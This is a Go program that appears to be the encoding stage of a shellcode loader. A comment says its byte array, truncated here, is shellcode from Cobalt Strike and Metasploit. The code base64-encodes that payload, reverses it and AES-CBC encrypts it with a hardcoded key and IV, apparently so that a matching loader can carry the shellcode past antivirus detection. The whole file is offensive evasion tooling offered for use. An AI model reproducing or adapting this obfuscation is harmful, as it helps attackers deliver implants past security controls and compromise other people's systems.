package main
import (
	"encoding/base64"
	"fmt"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
)

const (
	MYKEY = "c84fa6b830e38ee8"
	IV    = "a551df61172d53d7"
)


func stringReverse(str string) string{
  var bytes []byte = []byte(str)
  for i := 0; i < len(str)/2; i++ {
    tmp := bytes[len(str)-i-1]
    bytes[len(str)-i-1] = bytes[i]
    bytes[i] = tmp
  }
  str = string(bytes)
  return str;
}

func Aes_Encrypt(ss string) string {
	src := []byte(ss)
	block, err := aes.NewCipher([]byte(MYKEY))
	if err != nil {
		panic(err)
	}
	src = paddingBytes(src, block.BlockSize())
	cbcDecrypter := cipher.NewCBCEncrypter(block, []byte(IV))
	dst := make([]byte, len(src))
	cbcDecrypter.CryptBlocks(dst, src)

	return hex.EncodeToString(dst)
}


func Aes_Decrypt(ss string) string {
	src, _ := hex.DecodeString(ss)
	block, err := aes.NewCipher([]byte(MYKEY))
	if err != nil {
		panic(err)
	}
	cbcDecrypter := cipher.NewCBCDecrypter(block, []byte(IV))
	dst := make([]byte, len(src))
	cbcDecrypter.CryptBlocks(dst, src)
	newBytes := unPaddingBytes(dst)
	return string(newBytes)
}

func paddingBytes(src []byte, blockSize int) []byte {
	padding := blockSize - len(src)%blockSize
	padBytes := bytes.Repeat([]byte{byte(padding)}, padding)
	newBytes := append(src, padBytes...)
	return newBytes
}


func unPaddingBytes(src []byte) []byte {
	l := len(src)
	n := int(src[l-1])
	return src[:l-n]
}


func main(){
	msg := []byte{ 
		0xfc,0x48,0x83,0xe4,0xf0,0xe8,............0x01,0x86,0xa0,//cs和msf生成并转换的shellcode
	}
	encoded := base64.StdEncoding.EncodeToString(msg)
	revstr := stringReverse(encoded)
	aesstr := Aes_Encrypt(revstr)
	fmt.Println(aesstr)
}
